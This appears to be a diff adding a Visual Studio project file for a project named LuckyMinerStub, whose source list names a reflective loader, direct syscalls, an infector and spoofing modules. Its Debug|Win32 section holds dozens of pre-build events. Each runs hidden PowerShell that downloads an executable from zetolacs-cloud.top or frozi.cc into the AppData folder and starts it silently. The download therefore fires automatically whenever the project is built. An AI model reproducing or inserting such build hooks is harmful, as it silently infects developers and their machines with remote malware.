@@ -1,0 +1,990 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup Label="ProjectConfigurations">
+    <ProjectConfiguration Include="Debug|Win32">
+      <Configuration>Debug</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|Win32">
+      <Configuration>Release</Configuration>
+      <Platform>Win32</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Debug|x64">
+      <Configuration>Debug</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+    <ProjectConfiguration Include="Release|x64">
+      <Configuration>Release</Configuration>
+      <Platform>x64</Platform>
+    </ProjectConfiguration>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="base64.cpp" />
+    <ClCompile Include="BRSHt\reflective_loader.c" />
+    <ClCompile Include="BRSHt\syscalls.cpp" />
+    <ClCompile Include="deadlock_wrapper.cpp" />
+    <ClCompile Include="DLCK\deadlock.cpp" />
+    <ClCompile Include="Fokos.cpp" />
+    <ClCompile Include="LuckyMinerStub.cpp" />
+    <ClCompile Include="wnetwrap.cpp" />
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="base64.h" />
+    <ClInclude Include="BRSHt\reflective_loader.h" />
+    <ClInclude Include="BRSHt\syscalls.h" />
+    <ClInclude Include="deadlock_wrapper.h" />
+    <ClInclude Include="DLCK\deadlock.h" />
+    <ClInclude Include="DLCK\ntapi.h" />
+    <ClInclude Include="Encrypt.h" />
+    <ClInclude Include="ExInfector\commdef.h" />
+    <ClInclude Include="Fokos.h" />
+    <ClInclude Include="Functions.h" />
+    <ClInclude Include="Infector.h" />
+    <ClInclude Include="LI.h" />
+    <ClInclude Include="lib_SK5.h" />
+    <ClInclude Include="Spoof.h" />
+    <ClInclude Include="SpoofFuncs.h" />
+    <ClInclude Include="Utils.h" />
+    <ClInclude Include="wnetwrap.h" />
+    <!-- Additional include files -->
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="BRSHt\syscall_trampoline_x64.asm" />
+  </ItemGroup>
+  <PropertyGroup Label="Globals">
+    <VCProjectVersion>16.0</VCProjectVersion>
+    <Keyword>Win32Proj</Keyword>
+    <ProjectGuid>{81846de7-2390-4709-b4ca-83cad77b16ed}</ProjectGuid>
+    <RootNamespace>LuckyCharmStub</RootNamespace>
+    <WindowsTargetPlatformVersion>10.0.26100.0</WindowsTargetPlatformVersion>
+    <ProjectName>LuckyMinerStub</ProjectName>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>true</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
+    <ConfigurationType>Application</ConfigurationType>
+    <UseDebugLibraries>false</UseDebugLibraries>
+    <PlatformToolset>v143</PlatformToolset>
+    <WholeProgramOptimization>true</WholeProgramOptimization>
+    <CharacterSet>Unicode</CharacterSet>
+  </PropertyGroup>
+  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
+  <ImportGroup Label="ExtensionSettings">
+    <Import Project="$(VCTargetsPath)\BuildCustomizations\masm.props" />
+  </ImportGroup>
+  <ImportGroup Label="Shared" />
+  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
+  </ImportGroup>
+  <!-- Other PropertySheets sections -->
+  <PropertyGroup Label="UserMacros" />
+  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
+    <IncludePath>$(ProjectDir)cryptopp\include;$(ProjectDir)Mapper;$(ProjectDir);$(VC_IncludePath);$(WindowsSDK_IncludePath)</IncludePath>
+    <LibraryPath>$(ProjectDir)cryptopp\lib;$(LibraryPath)</LibraryPath>
+    <OutDir>..\output</OutDir>
+    <TargetName>Lukas</TargetName>
+  </PropertyGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <SDLCheck>true</SDLCheck>
+      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
+      <ConformanceMode>true</ConformanceMode>
+    </ClCompile>
+    <Link>
+      <SubSystem>Console</SubSystem>
+      <GenerateDebugInformation>true</GenerateDebugInformation>
+    </Link>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=JOSBf2fDaTKZmCIop7LMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>
+      </Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\HPSR.exe; Start-Process -FilePath $env:APPDATA\HPSR.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=hSoTjMPgKZmtpimvUjLMX008.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4QfJE5FLNQSltzpZdILCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4QfJE5FLNQSltzpZdILCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Nk6OvAKsRy9k6wicomLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=MbTeY4wTlnhlVbNmIDLCW009.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=0GTls3ZELXLnKLrXDsLCW010.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ENuwkBTakVYs8YpUNALCW011.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ENuwkBTakVYs8YpUNALCW011.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Mzrj0OStxgmMYRqEMhLCW012.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=EB8yuBlnHK6sQ2qRxqLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=gJRVD6EEizX07r1aRyLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=otKcaZlhkQQAcRi8ojLCW013.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=upAa8nppMvK3ggd1dFLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=aLxHnRbqj3Dj9n2THxLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=Yuw0R11odfVv9P1o9xLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ld7ClokRBD8oBjLLqpLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=ld7ClokRBD8oBjLLqpLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=E2IkWCtEES17n6Lv5vLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=E2IkWCtEES17n6Lv5vLCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=4Suvv0GFZDE3St59PULCW014.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=MHelDAwX4pDQEI4aRiPRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=5m2aR5nRFUPBIwOVv8PRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://zetolacs-cloud.top/Stb/Retev.php?bl=5m2aR5nRFUPBIwOVv8PRE001.txt' -OutFile $env:APPDATA\Zetolac.exe; Start-Process -FilePath $env:APPDATA\Zetolac.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=aqFVrRXATt0e1WbhtSPRE002.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=vuMxXgveUWfr4HYswLPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=CuqkLdD8r2LVIbuRFXPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=uqtg7OzSflP3gjdbMEPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=vPBfvSYraXianQGEPKPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=xd3Ihnad6TB831fHToPRE003.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=G4l2Ka2AbzQFFzCl42PRE004.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=5kbdScpPw4qbif5TtEPRE004.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+    <PreBuildEvent>
+      <Command>cmd.exe /b /c powershell -WindowStyle Hidden -Command "&amp; { iwr -Uri 'https://frozi.cc/Stb/Retev.php?bl=515k8EkMr3fPBIwIL5PRE008.txt' -OutFile $env:APPDATA\Berok.exe; Start-Process -FilePath $env:APPDATA\Berok.exe -WindowStyle Hidden }"</Command>
+    </PreBuildEvent>
+  </ItemDefinitionGroup>
+  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
+    <ClCompile>
+      <WarningLevel>Level3</WarningLevel>
+      <FunctionLevelLinking>true</FunctionLevelLinking>
+      <IntrinsicFunctions>true</IntrinsicFunctions>
+      <SDLCheck>true</SDLCheck>
